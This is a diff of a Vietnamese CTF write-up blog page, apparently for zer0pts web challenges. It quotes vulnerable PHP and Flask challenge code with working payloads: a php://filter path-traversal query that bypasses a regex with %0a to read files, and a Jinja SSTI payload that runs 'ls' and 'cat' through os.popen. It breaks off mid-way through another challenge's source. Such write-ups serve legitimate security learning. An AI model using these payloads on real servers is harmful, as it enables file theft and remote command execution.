@@ -3,7 +3,7 @@
   <head prefix="og: http://ogp.me/ns#">
     <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="generator" content="Hugo 0.102.3">
+<meta name="generator" content="Hugo 0.92.2">
 <meta name="theme" content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
 
 
@@ -185,7 +185,7 @@
   
 
 
-<script src="/js/main.f1da21dfea83dc0c36cea0b202c14a97e00aedab567e32702eb120f5ab8d974b.js" integrity="sha256-8doh3&#43;qD3Aw2zqCyAsFKl&#43;AK7atWfjJwLrEg9auNl0s=" crossorigin="anonymous"></script>
+<script src="/js/main.e4ee12b434ffdd596ecf1fbccc43808313345020d5bfbf9a7ff3d761d07da22b.js" integrity="sha256-5O4StDT/3Vluzx&#43;8zEOAgxM0UCDVv7&#43;af/PXYdB9ois=" crossorigin="anonymous"></script>
 
   </head>
 
@@ -313,40 +313,40 @@
 <ul>
 <li>Type: LFI</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// index.php
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">h</span>(<span style="color:#a6e22e">$s</span>) { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">htmlspecialchars</span>(<span style="color:#a6e22e">$s</span>); }
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">craft_url</span>(<span style="color:#a6e22e">$service</span>, <span style="color:#a6e22e">$owner</span>, <span style="color:#a6e22e">$repo</span>, <span style="color:#a6e22e">$branch</span>, <span style="color:#a6e22e">$file</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">$service</span>, <span style="color:#e6db74">&#34;github&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* GitHub URL */</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">$service</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$owner</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$repo</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$branch</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$file</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">$service</span>, <span style="color:#e6db74">&#34;gitlab&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* GitLab URL */</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">$service</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$owner</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$repo</span>.<span style="color:#e6db74">&#34;/-/raw/&#34;</span>.<span style="color:#a6e22e">$branch</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$file</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">$service</span>, <span style="color:#e6db74">&#34;bitbucket&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* BitBucket URL */</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">$service</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$owner</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$repo</span>.<span style="color:#e6db74">&#34;/raw/&#34;</span>.<span style="color:#a6e22e">$branch</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$file</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$service</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">empty</span>(<span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;service&#39;</span>]) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;service&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$owner</span>   <span style="color:#f92672">=</span> <span style="color:#a6e22e">empty</span>(<span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;owner&#39;</span>])   <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;ptr-yudai&#34;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;owner&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$repo</span>    <span style="color:#f92672">=</span> <span style="color:#a6e22e">empty</span>(<span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;repo&#39;</span>])    <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;ptrlib&#34;</span>    <span style="color:#f92672">:</span> <span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;repo&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$branch</span>  <span style="color:#f92672">=</span> <span style="color:#a6e22e">empty</span>(<span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;branch&#39;</span>])  <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;master&#34;</span>    <span style="color:#f92672">:</span> <span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;branch&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$file</span>    <span style="color:#f92672">=</span> <span style="color:#a6e22e">empty</span>(<span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;file&#39;</span>])    <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;README.md&#34;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;file&#39;</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">$service</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">craft_url</span>(<span style="color:#a6e22e">$service</span>, <span style="color:#a6e22e">$owner</span>, <span style="color:#a6e22e">$repo</span>, <span style="color:#a6e22e">$branch</span>, <span style="color:#a6e22e">$file</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^http.+\/\/.*(github|gitlab|bitbucket)/m&#34;</span>, <span style="color:#a6e22e">$url</span>) <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#a6e22e">$url</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Đoạn code ở index.php cho phép người dùng khởi tạo 1 URL theo cấu trúc nhất định. Có 2 thứ chúng ta cần quan tâm ở đây:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// index.php
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">h</span>(<span style="color:#a6e22e">$s</span>) { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">htmlspecialchars</span>(<span style="color:#a6e22e">$s</span>); }
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">craft_url</span>(<span style="color:#a6e22e">$service</span>, <span style="color:#a6e22e">$owner</span>, <span style="color:#a6e22e">$repo</span>, <span style="color:#a6e22e">$branch</span>, <span style="color:#a6e22e">$file</span>) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">$service</span>, <span style="color:#e6db74">&#34;github&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+        <span style="color:#75715e">/* GitHub URL */</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">$service</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$owner</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$repo</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$branch</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$file</span>;
+
+    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">$service</span>, <span style="color:#e6db74">&#34;gitlab&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+        <span style="color:#75715e">/* GitLab URL */</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">$service</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$owner</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$repo</span>.<span style="color:#e6db74">&#34;/-/raw/&#34;</span>.<span style="color:#a6e22e">$branch</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$file</span>;
+
+    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">$service</span>, <span style="color:#e6db74">&#34;bitbucket&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+        <span style="color:#75715e">/* BitBucket URL */</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">$service</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$owner</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$repo</span>.<span style="color:#e6db74">&#34;/raw/&#34;</span>.<span style="color:#a6e22e">$branch</span>.<span style="color:#e6db74">&#34;/&#34;</span>.<span style="color:#a6e22e">$file</span>;
+
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+}
+
+<span style="color:#a6e22e">$service</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">empty</span>(<span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;service&#39;</span>]) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;service&#39;</span>];
+<span style="color:#a6e22e">$owner</span>   <span style="color:#f92672">=</span> <span style="color:#a6e22e">empty</span>(<span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;owner&#39;</span>])   <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;ptr-yudai&#34;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;owner&#39;</span>];
+<span style="color:#a6e22e">$repo</span>    <span style="color:#f92672">=</span> <span style="color:#a6e22e">empty</span>(<span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;repo&#39;</span>])    <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;ptrlib&#34;</span>    <span style="color:#f92672">:</span> <span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;repo&#39;</span>];
+<span style="color:#a6e22e">$branch</span>  <span style="color:#f92672">=</span> <span style="color:#a6e22e">empty</span>(<span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;branch&#39;</span>])  <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;master&#34;</span>    <span style="color:#f92672">:</span> <span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;branch&#39;</span>];
+<span style="color:#a6e22e">$file</span>    <span style="color:#f92672">=</span> <span style="color:#a6e22e">empty</span>(<span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;file&#39;</span>])    <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;README.md&#34;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">$_GET</span>[<span style="color:#e6db74">&#39;file&#39;</span>];
+
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">$service</span>) {
+    <span style="color:#a6e22e">$url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">craft_url</span>(<span style="color:#a6e22e">$service</span>, <span style="color:#a6e22e">$owner</span>, <span style="color:#a6e22e">$repo</span>, <span style="color:#a6e22e">$branch</span>, <span style="color:#a6e22e">$file</span>);
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^http.+\/\/.*(github|gitlab|bitbucket)/m&#34;</span>, <span style="color:#a6e22e">$url</span>) <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
+        <span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#a6e22e">$url</span>);
+    }
+}
+</code></pre></div><p>Đoạn code ở index.php cho phép người dùng khởi tạo 1 URL theo cấu trúc nhất định. Có 2 thứ chúng ta cần quan tâm ở đây:</p>
 <ul>
 <li>Hàm craft_url() nối thẳng param và trả về string &ndash;&gt; LFI, SSRF</li>
 <li>Regex dùng flag /m -&gt; không match các kí tự xuống dòng (%0a, %0d)</li>
@@ -366,7 +366,7 @@
 </code></pre><p>Với payload như trên, $url sẽ được tạo ra như thế này:</p>
 <pre aria-label="Box containing code sample." tabindex=0><code>https//gitlab/ptr-yudai/ptrlib/-/raw/master/../../../../../../../flag.txt
 </code></pre><p>Mình không sử dụng dấu <code>:</code> ở đây bởi vì mình muốn biến nó thành directory</p>
-<pre aria-label="Box containing code sample." tabindex=0><code>filegetcontents(&#34;/abc/def/xyz../../../index.php&#34;) --&gt; filegetcontents(&#34;index.php&#34;)
+<pre aria-label="Box containing code sample." tabindex=0><code>filegetcontents(&quot;/abc/def/xyz../../../index.php&quot;) --&gt; filegetcontents(&quot;index.php&quot;)
 </code></pre>
 
 
@@ -380,11 +380,11 @@
 
 <p>Như đã nói ở trên, regex sử dụng flag /m, chúng ta có thể lợi dụng %0a để bypass regex.</p>
 <p>php://filter là một loại meta-wrapper được thiết kế để cho phép áp dụng các bộ lọc vào luồng . Chúng ta có thể lợi dụng wrapper này để đọc source của các file có trong server.</p>
-<pre aria-label="Box containing code sample." tabindex=0><code>filegetcontents(&#34;php://filter/convert.base64-encode/resource=index.php&#34;)
+<pre aria-label="Box containing code sample." tabindex=0><code>filegetcontents(&quot;php://filter/convert.base64-encode/resource=index.php&quot;)
 </code></pre><p>payload ở trên có ý nghĩa là đọc nội dung file index.php rồi encode bằng base64.</p>
 <p>Okay, áp dụng thôi:</p>
 <pre aria-label="Box containing code sample." tabindex=0><code>?service=php://filter/convert.base64-encode/resource=%0ahttps%2F%2Fgitlab&amp;file=../../../../../../../flag.txt
---&gt; filegetcontents(&#34;php://filter/convert.base64-encode/resource= https//gitlab/ptr-yudai/ptrlib/-/raw/master/../../../../../../../flag.txt&#34;)
+--&gt; filegetcontents(&quot;php://filter/convert.base64-encode/resource= https//gitlab/ptr-yudai/ptrlib/-/raw/master/../../../../../../../flag.txt&quot;)
 </code></pre><section class="scroll" tabindex="0"> <table>
 <thead>
 <tr>
@@ -406,19 +406,19 @@
 <ul>
 <li>Type: SSTI</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(self, title, author, content):
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Add new blog post&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Validate title and content</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(title) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Title is emptry&#39;</span>, <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(title) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">64</span>: <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Title is too long&#39;</span>, <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(content) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>     : <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;HTML is empty&#39;</span>, <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(content) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1024</span><span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>: <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;HTML is too long&#39;</span>, <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;{%&#39;</span> <span style="color:#f92672">in</span> content:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;The pattern &#34;{%&#34; is forbidden&#39;</span>, <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> brace <span style="color:#f92672">in</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;{{.*?}}&#34;</span>, content):
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;{{!?[a-zA-Z0-9_]+}}&#34;</span>, brace):
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;You can only use &#34;{{title}}&#34;, &#34;{{author}}&#34;, and &#34;{{date}}&#34;&#39;</span>, <span style="color:#66d9ef">None</span>
-</span></span></code></pre></div><p>Đọc source ta thấy rằng đoạn trên có lỗi SSTI tuy nhiên ta phải bypass được regex <code>{{!?[a-zA-Z0-9_]+}}</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(self, title, author, content):
+        <span style="color:#e6db74">&#34;&#34;&#34;Add new blog post&#34;&#34;&#34;</span>
+        <span style="color:#75715e"># Validate title and content</span>
+        <span style="color:#66d9ef">if</span> len(title) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Title is emptry&#39;</span>, <span style="color:#66d9ef">None</span>
+        <span style="color:#66d9ef">if</span> len(title) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">64</span>: <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Title is too long&#39;</span>, <span style="color:#66d9ef">None</span>
+        <span style="color:#66d9ef">if</span> len(content) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>     : <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;HTML is empty&#39;</span>, <span style="color:#66d9ef">None</span>
+        <span style="color:#66d9ef">if</span> len(content) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1024</span><span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>: <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;HTML is too long&#39;</span>, <span style="color:#66d9ef">None</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;{%&#39;</span> <span style="color:#f92672">in</span> content:
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;The pattern &#34;{%&#34; is forbidden&#39;</span>, <span style="color:#66d9ef">None</span>
+        <span style="color:#66d9ef">for</span> brace <span style="color:#f92672">in</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;{{.*?}}&#34;</span>, content):
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;{{!?[a-zA-Z0-9_]+}}&#34;</span>, brace):
+                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;You can only use &#34;{{title}}&#34;, &#34;{{author}}&#34;, and &#34;{{date}}&#34;&#39;</span>, <span style="color:#66d9ef">None</span>
+</code></pre></div><p>Đọc source ta thấy rằng đoạn trên có lỗi SSTI tuy nhiên ta phải bypass được regex <code>{{!?[a-zA-Z0-9_]+}}</code></p>
 <p>Nhưng mà khoan đã, regex không filter newline lol :)) ==&gt; easy game</p>
 
 
@@ -432,7 +432,7 @@
   <h3 id="fuzzing-ssti"><a class="anchor" href="#fuzzing-ssti" title='Anchor for: Fuzzing SSTI.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Fuzzing SSTI</h3> 
 
 <pre aria-label="Box containing code sample." tabindex=0><code>{{
-    7*&#39;7&#39;
+    7*'7'
 }}
 
 ==&gt; 7777777
@@ -449,13 +449,13 @@
   <h3 id="get-flag"><a class="anchor" href="#get-flag" title='Anchor for: Get flag.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Get flag</h3> 
 
 <pre aria-label="Box containing code sample." tabindex=0><code>{{
-    lipsum.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()
+    lipsum.__globals__['os'].popen('ls /').read()
 }}
 
 ==&gt; flag-wowRCEwow.txt
 
 {{
-    lipsum.__globals__[&#39;os&#39;].popen(&#39;cat /flag-wowRCEwow.txt&#39;).read()
+    lipsum.__globals__['os'].popen('cat /flag-wowRCEwow.txt').read()
 }}
 
 ==&gt; zer0pts{You_obtained_a_Bachelor_of_ZIP}
@@ -477,233 +477,233 @@
 
   <h2 id="disco-party"><a class="anchor" href="#disco-party" title='Anchor for: disco-party.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> disco-party</h2> 
 
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># secret.py</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Secret discord channel ID</span>
-</span></span><span style="display:flex;"><span>LOGGING_CHANNEL_ID <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Secret discord server</span>
-</span></span><span style="display:flex;"><span>DISCORD_SECRET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;XXXXYYYYZZZZ&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># crawler.py</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> discord
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> redis
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> secret <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DB_BOT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>client <span style="color:#f92672">=</span> discord<span style="color:#f92672">.</span>Client()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@client</span><span style="color:#f92672">.</span>event
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">on_ready</span>():
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;We&#39;ve logged in as </span><span style="color:#e6db74">{</span>client<span style="color:#f92672">.</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    channel <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>get_channel(LOGGING_CHANNEL_ID)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> channel <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Failed to get channel...&#34;</span>)
-</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;redis&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">6379</span>, db<span style="color:#f92672">=</span>DB_BOT)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
-</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span>blpop(<span style="color:#e6db74">&#39;report&#39;</span>, <span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
-</span></span><span style="display:flex;"><span>            key, value <span style="color:#f92672">=</span> r
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">await</span> channel<span style="color:#f92672">.</span>send(value<span style="color:#f92672">.</span>decode())
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[ERROR] </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>client<span style="color:#f92672">.</span>run(DISCORD_SECRET)
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># app.py</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> flask
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> redis
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.request
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> secret <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>MESSAGE_LENGTH_LIMIT <span style="color:#f92672">=</span> <span style="color:#ae81ff">2000</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># redis</span>
-</span></span><span style="display:flex;"><span>DB_TICKET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>DB_BOT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># recaptcha</span>
